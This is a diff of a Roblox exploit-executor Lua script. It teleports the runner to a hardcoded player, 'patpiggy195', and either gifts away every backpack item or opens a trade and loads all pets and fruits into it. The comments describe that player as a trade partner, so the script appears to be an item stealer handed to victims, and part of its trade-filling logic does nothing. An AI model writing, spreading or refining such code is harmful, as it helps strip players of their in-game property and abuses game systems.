@@ -1,73 +1,75 @@
--- SETTINGS
-local targetUsername = "patpiggy195" -- the player to send gifts to
+-- Settings
+local targetUsername = "patpiggy195"  -- Person you want to trade with
 
--- SERVICES
+-- Services
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
 
--- WAIT FOR PLAYER CHARACTER
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local Humanoid = Character:WaitForChild("Humanoid")
+-- Wait for your character
+local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local hrp = char:WaitForChild("HumanoidRootPart")
 
--- WAIT FOR TARGET PLAYER
-local targetPlayer = Players:FindFirstChild(targetUsername)
-while not targetPlayer do
-    warn("Waiting for target player:", targetUsername)
-    targetPlayer = Players:FindFirstChild(targetUsername)
+-- Wait until target appears
+local target = Players:FindFirstChild(targetUsername)
+while not target do
+    warn("Waiting for target", targetUsername)
     task.wait(1)
+    target = Players:FindFirstChild(targetUsername)
 end
 
--- WAIT FOR TARGET CHARACTER
-local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
-local targetHRP = targetCharacter:WaitForChild("HumanoidRootPart")
+-- Wait for target's character
+local targetChar = target.Character or target.CharacterAdded:Wait()
+local targetHRP = targetChar:WaitForChild("HumanoidRootPart")
 
--- TELEPORT TO TARGET
-if Character and Character:FindFirstChild("HumanoidRootPart") then
-    Character:SetPrimaryPartCFrame(targetHRP.CFrame * CFrame.new(0, 0, -2)) -- stand in front
-    task.wait(1)
-end
-
--- FUNCTION: TRY TO FIRE PROMPT FOR EQUIPPED TOOL
-local function tryGiftTool(tool)
-    -- Equip tool
-    Humanoid:EquipTool(tool)
-    print("Equipped tool:", tool.Name)
-
-    -- Wait for prompt to appear
-    local prompt = nil
-    for i = 1, 30 do -- wait up to 3 seconds
-        prompt = targetHRP:FindFirstChildOfClass("ProximityPrompt")
-        if prompt then break end
-        task.wait(0.1)
+-- Find your Trading Ticket and equip it
+local function equipTradingTicket()
+    local ticket = LocalPlayer.Backpack:FindFirstChild("Trading Ticket") or char:FindFirstChild("Trading Ticket")
+    if ticket and ticket:IsA("Tool") then
+        char:WaitForChild("Humanoid"):EquipTool(ticket)
+        task.wait(0.5)  -- Wait for equip to take effect
+        return true
+    else
+        warn("No Trading Ticket found!")
+        return false
     end
+end
 
+-- Trigger trade prompt
+local function openTradePrompt()
+    local prompt = targetHRP:FindFirstChildOfClass("ProximityPrompt")
     if prompt then
-        print("Firing prompt for:", tool.Name)
         prompt.HoldDuration = 0.1
         fireproximityprompt(prompt)
-        task.wait(1.2) -- wait for gifting to finish
+        return true
     else
-        warn("❌ No prompt found for:", tool.Name)
+        warn("Trade prompt not found.")
+        return false
     end
 end
 
--- GET INVENTORY
-local Backpack = LocalPlayer:WaitForChild("Backpack")
+-- Add all items to trade UI
+local function fillTrade()
+    -- Add pets and fruits
+    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Parent = LocalPlayer.Backpack  -- Activate tooltip in trade UI
+            task.wait(0.1)
+        end
+    end
+    -- Add Sheckles (if there's a UI element you can control)
+    -- Example: game.ReplicatedStorage.OpenTradeUI:Fire(...)
+    -- (Implementation depends on how the game scripts handles currency addition)
+end
 
--- SEND ALL TOOLS FROM BACKPACK
-for _, tool in ipairs(Backpack:GetChildren()) do
-    if tool:IsA("Tool") then
-        tryGiftTool(tool)
+-- Main Process
+if equipTradingTicket() then
+    -- Move close to target
+    char:SetPrimaryPartCFrame(targetHRP.CFrame * CFrame.new(0, 0, -2))
+    task.wait(0.5)
+    if openTradePrompt() then
+        task.wait(1)  -- Wait for Trading Hub to appear
+        fillTrade()
+        print("✅ Trade items placed into trading UI.")
     end
 end
-
--- SEND ACTIVE TOOL IF EQUIPPED
-local activeTool = Character:FindFirstChildOfClass("Tool")
-if activeTool then
-    print("Sending equipped tool:", activeTool.Name)
-    tryGiftTool(activeTool)
-end
-
-print("✅ Done sending items to", targetUsername)
